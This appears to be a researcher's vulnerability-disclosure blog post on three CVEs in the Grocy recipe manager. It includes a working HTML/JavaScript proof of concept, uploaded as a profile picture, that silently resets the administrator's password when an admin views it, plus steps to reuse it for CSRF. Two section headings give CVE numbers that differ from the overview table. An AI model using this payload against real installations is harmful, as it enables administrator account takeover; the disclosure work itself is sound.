---
title: All Your Recipe Are Belong to Us (Part 1/3) - Stored XSS, CSRF and Broken Access Control Vulnerabilities in Grocy
date: 2024-11-27T04:00:56+01:00
toc: false
images: 
tags:
  - CVE
  - Web
  - English
---

I used 4 hours of my free time (not counting the Responsible Disclosure and Blog Posts...) to "speed pentest" the three biggest and most popular (measured by Github stars) open-source recipe managers. 

This included [Grocy](https://github.com/grocy/grocy), which had >6900 stars at the time of testing. Here I found 3 vulnerabilities. The first one is an _Unrestricted File Upload_, through which it was possible to upload any files. This included HTML and SVG files to achieve _Stored XSS_. The second one is a _CSRF_ vulnerability, because the session token has no security flags set, as well as no CSRF countermeasure is implemented. The last one is "one" _Broken Access Control_ vulnerability: For most functions, only the link in the sidebar is disabled for unauthorized users, but a direct call to the URL or API endpoint allows access to data for which you have no permissions.

## Overview of the Vulnerabilities
| CVE | Name                                                                               | CVSS Score      |
| ----- | ---------------------------------------------------------------------------------- | ------ |
| [CVE-2024-55074](https://www.cve.org/CVERecord?id=CVE-2024-55074) | Unrestricted File Upload: Users can upload HTML or SVG files to exploit Stored XSS | [8.7 High](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N) |
| [CVE-2024-55075](https://www.cve.org/CVERecord?id=CVE-2024-55075) | CSRF: Change the administrator's password                                          | [6.8 Medium](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N) |
| [CVE-2024-55076](https://www.cve.org/CVERecord?id=CVE-2024-55076) | BAC: Users can directly call functions, which they are not authorized for          | [6.5 Medium](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N) |

## Remediation

The maintainer stated that they do not care about the vulnerabilities because Grocy is a hobby project and not intended for the use in a sensitive enterprise area. This means that the vulnerabilities probably won't get fixed.

## Vulnerabilities in Detail

### [CVE-2024-55074] Unrestricted File Upload: Users can upload HTML or SVG files to exploit Stored XSS (8.7 High)
Users have by default the permission to edit their own profile. There they can upload a profile picture. However it is not validated whether the uploaded file is a benign picture or not. Thus, it is possible to upload malicious HTML or SVG files. As a POC I've created the following HTML file:
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Update User</title>
</head>
<body>
    <h1 id="status">Loading...</h1>
    <script>
        // Function to perform the PUT request
        async function updateUser() {
            const url = '/api/users/1'; // Target endpoint
            const payload = {
                username: "admin",
                first_name: "",
                last_name: "",
                change_password: "1",
                password: "NewPassword123",
                password_confirm: "NewPassword123"
            };

            try {
                const response = await fetch(url, {
                    method: 'PUT',
                    credentials: 'include', // Include cookies in the request
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload) // Convert payload to JSON string
                });

                if (response.ok) {
                    document.getElementById('status').textContent = 'User updated successfully!';
                } else {
                    const errorText = await response.text();
                    document.getElementById('status').textContent = 'Failed to update user: ' + errorText;
                }
            } catch (error) {
                document.getElementById('status').textContent = 'Error: ' + error.message;
            }
        }

        // Execute the request when the page loads
        (async function execute() {
            await updateUser();
        })();
    </script>
</body>
</html>
```
When the file is viewed by an administrator, the JavaScript will issue a request that changes the password of the user with id 1 (by default an administrator) to `NewPassword123`.
The following screenshot shows the upload function:

![Grocy1](/media/2024/11/grocy1.png)

After saving the changes, we can see the URL of the uploaded file

![Grocy2](/media/2024/11/grocy2.png)

We need to remove the appended `?force_serve_as=picture&best_fit_width=32&best_fit_height=32` in order for the file to be executed

![Grocy3](/media/2024/11/grocy3.png)

As we do not have administrative rights (YET ;)) we receive an error message. However, if an administrator visits the url, the request is successful

![Grocy4](/media/2024/11/grocy4.png)

Now we can login as the administrator `admin` with the newly set password `NewPassword123`

![Grocy5](/media/2024/11/grocy5.png)

### [CVE-2024-45875] CSRF: Change the administrator's password (6.8 Medium)
The session cookie has no security flags (escpecially SameSite) set

![Grocy6](/media/2024/11/grocy6.png)

Further no CSRF countermeasures (such as CSRF-Tokens) are implemented at all, leaving all functions vulnerable to CSRF. E.g. see the following request to change the administrator's password

![Grocy7](/media/2024/11/grocy7.png)

The same POC as the previous vulnerability can be used, but instead of the relative URL a absolute URL needs to be specified. If an adminstrative user visits this POC on the attacker's website, the password of the default administrative user will be changed.

### [CVE-2024-55074] Broken Access Control: Users can directly call functions, which they are not authorized for (6.5 Medium)

As a starting point, we create a user `user` with no permissions

![Grocy8](/media/2024/11/grocy8.png)

The user is not authorized to access most of the functions of the webapp. The links to those functions are deactivated on the sidebar. However the user is still able to access those functions by requesting their URL directly. e.g. we can request /calendar in order to view the calendar and its entries.

![Grocy9](/media/2024/11/grocy9.png)

A further example are the recipes

![Grocy10](/media/2024/11/grocy10.png)

This affetcs ALL functions except the user management.

However, it is only possible to view data and not to modify it.

## Timeline
| Date | Event |
| - | - |
| 2024-11-26 | Discovered the vulnerabilities |
| 2024-11-26 | Reported the vulnerabilites |
| 2024-11-26 | Maintainer replied that they do *NOT* want to be bothered with "irrelevant" security issues and that I may publish my blog post |
| 2024-11-27 | CVEs requested |
| 2025-01-06 | CVEs were assigned |
